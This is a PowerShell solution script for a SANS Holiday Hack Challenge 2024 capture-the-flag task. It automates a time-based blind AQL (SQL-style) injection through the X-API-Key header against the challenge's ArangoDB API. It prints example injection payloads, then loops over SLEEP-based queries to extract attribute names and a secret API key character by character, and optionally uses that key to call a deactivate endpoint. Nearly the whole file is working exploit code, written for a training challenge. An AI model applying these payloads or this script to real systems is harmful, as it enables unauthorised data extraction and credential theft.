<#
    .SYNOPSIS

        Holiday Hack Challenge 2024 - Snow-maggedon

        Deactivate Frostbit Naughty-Nice List Publication
        Difficulty: 5 of 5

        Author: Nick DeBaggis
        License: BSD 3-Clause
        Required Dependencies: Powershell 7
        Optional Dependencies: None

    .DESCRIPTION

        This script exfiltrates data from the Frostbit Ransomware API server running ArangoDB as the backend DBMS.
        It is based on a blind AQLi (SQLi) in the X-API-Key HTTP header.  We're able to execute our own operations using
        the ternary operator (true or false statement or operation) ? (run if true) : (run if false).

        This allows us to exfiltrate data using numerous unfiltered operators such as ATTRIBUTES, LENGTH,
        and SUBSTRING.  Carefully constructing queries using these operations results in the ability to infer
        what data attribute names and values exist in the dbms collection.

        In these examples a TRUE result means that SLEEP(2) was executed because the prior test operation resulted
        in a true response and hence the response from the API to the request should take > 2 seconds.  Whereas,
        a FALSE result means that SLEEP(2) is not executed with the ternary operator short-circuiting the operation.
        This results in a much quicker response time from the API.

        Below response times are approximate examples of my very early poking and prodding:

        TRUE, response time 2204 ms : X-API-Key: ' OR "_key" IN ATTRIBUTES(doc) ? SLEEP(2) : '
        FALSE response time  137 ms : X-API-Key: ' OR  "_ke" IN ATTRIBUTES(doc) ? SLEEP(2) : '
        TRUE  response time 2120 ms : X-API-Key: ' OR  "_id" IN ATTRIBUTES(doc) ? SLEEP(2) : '
        FALSE response time  267 ms : X-API-Key: ' OR   "_i" IN ATTRIBUTES(doc) ? SLEEP(2) : '

        Based on the AQL error from the api, these expand out to:
        FOR doc IN config
            FILTER doc.<key_name_omitted> == '' OR "_key" IN ATTRIBUTES(doc) ? SLEEP(2) : ''
            <other_query_lines_omitted>
            RETURN doc


    .PARAMETER BotUUID

        Required Bot UUID, this is unique to each player and set of generated artifacts.
        You can find this UUID in both the frostbit_core_dump file strings as well as the
        pcap file provided you have decrypted the TLS HTTP traffic stream.

        The BotUUID will have this format of hex chars and dashes (example only):
        f14d60cd-67b9-44ec-8f41-b5ea5137413c

    .PARAMETER SQLSleepTimeSeconds

        Optional Number of seconds to set each ArangoDB SLEEP() time for the AQLi.
        Should be between 0.5 and 2.0 based on prior testing.  Lower sleep times will let the
        script run faster but may cause the results to be incorrect. If the data doesn't look correct
        or there are time-outs or other errors try increasing this closer to 2.0, or, just don't
        supply this parameter at all.

    .PARAMETER Deactivate

        Optional Use the found X-API-Key to automatically deactivate the Frostbit ransomware data publication.

    .EXAMPLE

        .\15-frostbit-deactivate-gold.ps1 -BotUUID f14d60cd-67b9-44ec-8f41-b5ea5137413c

    .EXAMPLE

        .\15-frostbit-deactivate-gold.ps1 -BotUUID f14d60cd-67b9-44ec-8f41-b5ea5137413c -Deactivate


    .EXAMPLE

        .\15-frostbit-deactivate-gold.ps1 -BotUUID f14d60cd-67b9-44ec-8f41-b5ea5137413c -SQLSleepTimeSeconds 1.5

    .LINK
        https://www.sans.org/mlp/holiday-hack-challenge-2024/


#>

[CmdletBinding()]
param(
    [Parameter(Mandatory=$true)]
    [String[]]$BotUUID,

    [Parameter(Mandatory=$false)]
    [float]$SQLSleepTimeSeconds,

    [Parameter(Mandatory=$false)]
    [switch]$Deactivate
)

function Is-UUID {
    param (
        [string]$InputString
    )

    $uuidRegex = '^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[1-5][0-9a-fA-F]{3}-[89abAB][0-9a-fA-F]{3}-[0-9a-fA-F]{12}$'
    return $InputString -match $uuidRegex
}

#
# Create array of chars a..z, 0..9, -, _ for later data inference ops.
# Explicity cast each array object to a string since powershell will create a mixed-object array.
#
$letters = @('0'..'9') + ('a'..'z') + '-' + '_'
$letters = $letters | ForEach-Object { [string]$_ }

# Set our default SLEEP() operation sleep time in seconds.
# This is determined by manually checking how long the response from the web app takes
# while iterating through increasing values for SLEEP().  Could be automated to find the maximum
# reasonable sleep time.  Through testing of this challenge's api it was determined the server's
# ArangoDB engine never responded slower than a max of around 2100 ms with SLEEP() values > 2.
$sleepytime = 2


if(-not (Is-UUID -InputString $BotUUID)){
    "Error badly formatted BotUUID, you can find yours in the decrypted TLS HTTP pcap data and the frostbit_core_dump file."
    return
}

if($SQLSleepTimeSeconds -and ($SQLSleepTimeSeconds -ge 0.5 -and $SQLSleepTimeSeconds -le 2.0)){
    $sleepytime = $SQLSleepTimeSeconds
}
else{
    "Sleep time must be in range: 0.5 to 2.0"
    return
}

$swtotal = [Diagnostics.Stopwatch]::StartNew()

# Set sleep time in miliseconds.
$sleepytimems = $sleepytime * 1000

# The request response time should always be greater than the sleep time but
# we'll set the margin just below that to be safe - HHC timewarps and all.
$sleeperrormargin = $sleepytimems * 0.99


$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$session.UserAgent = "Mozilla/5.0"

$totalops = 0
$len = 0

"Starting Frostbit Deactivation Attack for BotUUID $BotUUID and AQLi SLEEP($sleepytime) on $(Get-Date)"

# If key-candidates.txt exists try brute-forcing the key name search with the list of possible key names.
# One key name per line.  Add known names such as: _id, _key, along with unknowns such as: blah, frostbit, etc.
if(Test-Path -Path key-candidates.txt){
    "`nTrying brute force search for attribute names in doc : "
    $list = Get-Content -Path key-candidates.txt
    foreach($key in $list) {

        $apikey = "`' OR `"$key`" IN ATTRIBUTES(doc) ? SLEEP($sleepytime) : `'"

        $sw = [Diagnostics.Stopwatch]::StartNew()

        $resp = (Invoke-WebRequest -UseBasicParsing -Uri "https://api.frostbit.app/api/v1/frostbitadmin/bot/$BotUUID/deactivate?debug=true" `
        -WebSession $session `
        -SkipHttpErrorCheck `
        -Headers @{
        "X-API-Key"="$apikey"
        }).Content | ConvertFrom-Json

        $sw.Stop()
        $totalops++

        if($sw.ElapsedMilliseconds -ge $sleeperrormargin){
            "Found: " + $key
        }
        else{
            "Not Found: " + $key
        }
    }
}

"`nTrying to find count of attribute names (keys) in doc including system keys: "
foreach($i in 0..64){
    $apikey = "`' OR LENGTH(ATTRIBUTES(doc)) == $i ? SLEEP($sleepytime) : `'"

    $sw = [Diagnostics.Stopwatch]::StartNew()

    $resp = (Invoke-WebRequest -UseBasicParsing -Uri "https://api.frostbit.app/api/v1/frostbitadmin/bot/$BotUUID/deactivate?debug=true" `
    -WebSession $session `
    -SkipHttpErrorCheck `
    -Headers @{
    "X-API-Key"="$apikey"
    }).Content | ConvertFrom-Json

    $sw.Stop()
    $totalops++
    if($sw.ElapsedMilliseconds -ge $sleeperrormargin){
        "Found: " + $i
        break
    }
}

"`nTrying to find count of attribute names (keys) in doc excluding system keys: "
foreach($i in 0..64){
    $apikey = "`' OR LENGTH(ATTRIBUTES(doc, true)) == $i ? SLEEP($sleepytime) : `'"

    $sw = [Diagnostics.Stopwatch]::StartNew()

    $resp = (Invoke-WebRequest -UseBasicParsing -Uri "https://api.frostbit.app/api/v1/frostbitadmin/bot/$BotUUID/deactivate?debug=true" `
    -WebSession $session `
    -SkipHttpErrorCheck `
    -Headers @{
    "X-API-Key"="$apikey"
    }).Content | ConvertFrom-Json

    $sw.Stop()
    $totalops++
    if($sw.ElapsedMilliseconds -ge $sleeperrormargin){
        "Found: " + $i
        break
    }
}


"`nTrying to find length of the attribute name in doc[0] excluding system keys: "
foreach($i in 0..64){
    $apikey = "`' OR LENGTH(ATTRIBUTES(doc, true)[0]) == $i ? SLEEP($sleepytime) : `'"

    $sw = [Diagnostics.Stopwatch]::StartNew()

    $resp = (Invoke-WebRequest -UseBasicParsing -Uri "https://api.frostbit.app/api/v1/frostbitadmin/bot/$BotUUID/deactivate?debug=true" `
    -WebSession $session `
    -SkipHttpErrorCheck `
    -Headers @{
    "X-API-Key"="$apikey"
    }).Content | ConvertFrom-Json

    $sw.Stop()
    $totalops++
    if($sw.ElapsedMilliseconds -ge $sleeperrormargin){
        "Found: " + $i
        $len = $i - 1
        break
    }
}


$name = ""
"`nTrying to find the name of the attribute in doc[0] excluding system keys: "
foreach($pos in 0..$len){
    foreach($letter in $letters){
        $apikey = "`' OR SUBSTRING(ATTRIBUTES(doc, true)[0], $pos, 1) == `"$letter`" ? SLEEP($sleepytime) : `'"

        $sw = [Diagnostics.Stopwatch]::StartNew()

        $resp = (Invoke-WebRequest -UseBasicParsing -Uri "https://api.frostbit.app/api/v1/frostbitadmin/bot/$BotUUID/deactivate?debug=true" `
        -WebSession $session `
        -SkipHttpErrorCheck `
        -Headers @{
        "X-API-Key"="$apikey"
        }).Content | ConvertFrom-Json

        $sw.Stop()
        $totalops++
        if($sw.ElapsedMilliseconds -ge $sleeperrormargin){
            $name += $letter
            break
        }
    }
}
"Found: " + $name


"`nTrying to find length of the attribute value in doc.$name : "
foreach($i in 0..64){
    $apikey = "`' OR LENGTH(doc.$name) == $i ? SLEEP($sleepytime) : `'"

    $sw = [Diagnostics.Stopwatch]::StartNew()

    $resp = (Invoke-WebRequest -UseBasicParsing -Uri "https://api.frostbit.app/api/v1/frostbitadmin/bot/$BotUUID/deactivate?debug=true" `
    -WebSession $session `
    -SkipHttpErrorCheck `
    -Headers @{
    "X-API-Key"="$apikey"
    }).Content | ConvertFrom-Json

    $sw.Stop()
    $totalops++
    if($sw.ElapsedMilliseconds -ge $sleeperrormargin){
        "Found: " + $i
        $len = $i - 1
        break
    }
}

$value = ""
"`nTrying to find the grand-prize, the value of doc.$name : "
foreach($pos in 0..$len){
    foreach($letter in $letters){
        $apikey = "`' OR SUBSTRING(doc.$name, $pos, 1) == `"$letter`" ? SLEEP($sleepytime) : `'"

        $sw = [Diagnostics.Stopwatch]::StartNew()

        $resp = (Invoke-WebRequest -UseBasicParsing -Uri "https://api.frostbit.app/api/v1/frostbitadmin/bot/$BotUUID/deactivate?debug=true" `
        -WebSession $session `
        -SkipHttpErrorCheck `
        -Headers @{
        "X-API-Key"="$apikey"
        }).Content | ConvertFrom-Json

        $sw.Stop()
        $totalops++
        if($sw.ElapsedMilliseconds -ge $sleeperrormargin){
            $value += $letter
            break
        }
    }
}
"Found: " + $value

if($Deactivate){
    $apikey = $value
    "`nAttempting to deactivate the ransomware infrastructure from publishing our data:"
    "Setting HTTP header X-API-Key: $apikey"
    "Sending GET request to https://api.frostbit.app/api/v1/frostbitadmin/bot/$BotUUID/deactivate?debug=true"
    $resp = (Invoke-WebRequest -UseBasicParsing -Uri "https://api.frostbit.app/api/v1/frostbitadmin/bot/$BotUUID/deactivate?debug=true" `
    -WebSession $session `
    -SkipHttpErrorCheck `
    -Headers @{
    "X-API-Key"="$apikey"
    })
    ($resp.Content | ConvertFrom-Json).message
    $totalops++
}
else{
    "Add the '-Deactivate' switch to automatically deactivate the publication of the naughty_nice_list.csv file"
}
$swtotal.Stop()
"`nCompleted Frostbit Deactivation Attack for BotUUID $BotUUID and AQLi SLEEP($sleepytime) on $(Get-Date)"
"Deactivation Attack took $($swtotal.Elapsed.Minutes) minutes, $($swtotal.Elapsed.Seconds) seconds."
"Total request operations: " + $totalops
